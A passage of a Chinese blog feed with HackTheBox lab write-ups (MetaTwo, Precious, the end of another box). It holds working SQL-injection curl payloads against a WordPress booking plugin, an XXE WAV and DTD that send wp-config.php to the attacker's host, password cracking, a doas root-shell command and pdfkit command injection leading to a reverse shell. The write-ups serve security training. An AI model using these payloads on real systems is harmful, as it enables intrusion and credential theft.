href="https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/">https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/</a></p></blockquote><p>意思就是把这个doas当成sudo来处理</p><p>添加dstat配置文件并调用即可提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27;</span> &gt; /usr/<span class="built_in">local</span>/share/dstat/dstat_BFL.py</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/doas -u root /usr/bin/dstat --BFL</span><br></pre></td></tr></table></figure><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53d6af62fd48af558d4bd82282e5c668</span><br></pre></td></tr></table></figure><hr /><blockquote><p>错误方法，正确答案</p></blockquote><p>当时查出来的user表看着很怪，但是还是能登入player账户（获取WebShell之后可以看<code>/etc/passwd</code>或者<code>/home/</code>得知player用户的存在），就没去看soccer_db了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user, password from mysql.user;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /root/app/server.js</span><br><span class="line">...</span><br><span class="line">const query = `Select id,username,password  FROM accounts <span class="built_in">where</span> id = <span class="variable">$&#123;id&#125;</span>`;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from soccer_db.accounts;</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| id   | email             | username | password             |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select user from mysql.user;</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">| debian-sys-maint |</span><br><span class="line">| mysql.infoschema |</span><br><span class="line">| mysql.session    |</span><br><span class="line">| mysql.sys        |</span><br><span class="line">| player           |</span><br><span class="line">| root             |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_MetaTwo</title>
    <link href="https://yoloyolo.top/2023/03/02/HackTheBox-MetaTwo/"/>
    <id>https://yoloyolo.top/2023/03/02/HackTheBox-MetaTwo/</id>
    <published>2023-03-02T16:41:22.000Z</published>
    <updated>2023-03-02T16:57:31.683Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_metatwo"><a class="markdownIt-Anchor" href="#hackthebox_metatwo"></a> HackTheBox_MetaTwo</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.186</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.186</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 828 closed ports, 169 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port21-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;2%Time&#x3D;64009A16%P&#x3D;x86_64-pc-linux-gnu%r(Gener</span><br><span class="line">SF:icLines,8F,&quot;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.</span><br><span class="line">SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea</span><br><span class="line">SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\</span><br><span class="line">SF:r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>请求WEB页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.11.186 -I</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 12:39:11 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;metapress.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名<code>metapress.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.186\tmetapress.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问页面是个Wordpress，没必要枚举了</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>枚举用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://metapress.htb/&quot;</span> -e u</span><br></pre></td></tr></table></figure><p>部分信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[+] robots.txt found: http:&#x2F;&#x2F;metapress.htb&#x2F;robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line"> [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line"> [+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Sitemap (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-sitemap-users-1.xml</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] manager</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>访问页面<code>http://metapress.htb/events/</code></p><p>在HTML代码中找到以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;metapress.htb&#x2F;wp-content&#x2F;plugins&#x2F;bookingpress-appointment-booking&#x2F;css&#x2F;bookingpress_element_theme.css?ver&#x3D;1.0.10</span><br></pre></td></tr></table></figure><p>确定该插件为 <code>bookingpress-appointment-booking 1.0.10</code></p><p>google得到相关漏洞</p><blockquote><p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p></blockquote><p>源代码中搜索<code>action:'bookingpress_front_get_category_services'</code></p><p>得到_wpnonce=7ea553b73c</p><p>进行手工SQL注入</p><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(schema_name) from information_schema.schemata-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>库名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">blog</span><br></pre></td></tr></table></figure><p>查表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=0x626c6f67-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>blog库表名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">wp_options</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_bookingpress_servicesmeta</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_users</span><br><span class="line">wp_bookingpress_customers_meta</span><br><span class="line">wp_bookingpress_settings</span><br><span class="line">wp_bookingpress_appointment_bookings</span><br><span class="line">wp_bookingpress_customize_settings</span><br><span class="line">wp_bookingpress_debug_payment_log</span><br><span class="line">wp_bookingpress_services</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_links</span><br><span class="line">wp_bookingpress_entries</span><br><span class="line">wp_bookingpress_categories</span><br><span class="line">wp_bookingpress_customers</span><br><span class="line">wp_bookingpress_notifications</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_bookingpress_default_daysoff</span><br><span class="line">wp_comments</span><br><span class="line">wp_bookingpress_default_workhours</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_bookingpress_form_fields</span><br><span class="line">wp_bookingpress_payment_logs</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=0x626c6f67 and table_name=0x77705f7573657273-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>blog库wp_users表列名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID</span><br><span class="line">user_login</span><br><span class="line">user_pass</span><br><span class="line">user_nicename</span><br><span class="line">user_email</span><br><span class="line">user_url</span><br><span class="line">user_registered</span><br><span class="line">user_activation_key</span><br><span class="line">user_status</span><br><span class="line">display_name</span><br></pre></td></tr></table></figure><p>查账户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,group_concat(user_login),group_concat(user_pass) from blog.wp_users-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>用户名与密码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</span><br><span class="line">manager:$P$B4aNM28N0E.tMy&#x2F;JIcnVMZbGcU16Q70</span><br></pre></td></tr></table></figure><p><strong>读出来的json里面，&quot;/“会被转义为”\/&quot;</strong></p><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 400 ./<span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到manager的账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager:partylikearockstar</span><br></pre></td></tr></table></figure><p>根据之前wpscan的结果，可以找到wordpress 5.6.2 XXE漏洞</p><blockquote><p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a><br /><a href="https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/">https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/</a><br /><a href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></p></blockquote><p>这个漏洞需要认证，即用户登陆状态才能出发</p><p>构造wav文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">&#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;http://10.10.*.*/xxe.dtd&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;&gt;%remote;%param1;%exfil;] &gt;\x00&#x27;</span>&gt; malicious.wav</span><br></pre></td></tr></table></figure><p>构造xxe.dtd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;wp-config.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>媒体库中上传wav文件即可出发XXE漏洞</p><p>得到FTP账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metapress.htb:9NYS_ii@FyL_p5M2NvJ</span><br></pre></td></tr></table></figure><p>登录FTP并获取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br><span class="line">metapress.htb</span><br><span class="line">9NYS_ii@FyL_p5M2NvJ</span><br><span class="line"><span class="built_in">cd</span> mailer</span><br><span class="line">get send_email.php</span><br></pre></td></tr></table></figure><p>得到以下账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure><p>尝试用于登录SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@10.10.11.186</span><br><span class="line">Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure><p>登陆成功</p><p>获取user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/user.txt </span><br><span class="line">1d67d6f8d41d206a8fb29e4570a4b6e2</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/password </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;p7qfAZt4_A1xo_0x&#x27;</span></span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span></span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">p7qfAZt4_A1xo_0x</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt </span><br><span class="line">686e0b48d30c2092e9ecc70f97a0086f</span><br></pre></td></tr></table></figure><hr /><p>Easiest privilege escalation ever.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Precious</title>
    <link href="https://yoloyolo.top/2023/03/02/HackTheBox-Precious/"/>
    <id>https://yoloyolo.top/2023/03/02/HackTheBox-Precious/</id>
    <published>2023-03-02T12:12:08.000Z</published>
    <updated>2023-03-02T12:32:06.290Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_precious"><a class="markdownIt-Anchor" href="#hackthebox_precious"></a> HackTheBox_Precious</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.189</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for precious.htb (10.10.11.189)</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>未枚举出路径</p><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问80端口的WEB服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.189/ -I</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 02:20:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;precious.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名precious.htb</p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.189\tprecious.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>使用域名可以进行访问</p><p>本地开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; python -m http.server 80</span><br></pre></td></tr></table></figure><p>将本地HTTP服务页面转为PDF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb -d <span class="string">&quot;url=http://10.10.*.*/&quot;</span> -o pdf</span><br></pre></td></tr></table></figure><p>查看文件EXIF信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool pdf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 11.16</span><br><span class="line">File Name                       : pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 22 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:02 10:42:33+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Creator                         : Generated by pdfkit v0.8.6</span><br></pre></td></tr></table></figure><p>搜索<code>pdfkit v0.8.6</code>，找到相关漏洞CVE-2022-25765</p><blockquote><p><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></p></blockquote><p>验证漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60id%60&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.189 - - [02&#x2F;Mar&#x2F;2023 11:34:00] &quot;GET &#x2F;?name&#x3D;%20uid&#x3D;1001(ruby)%20gid&#x3D;1001(ruby)%20groups&#x3D;1001(ruby) HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span 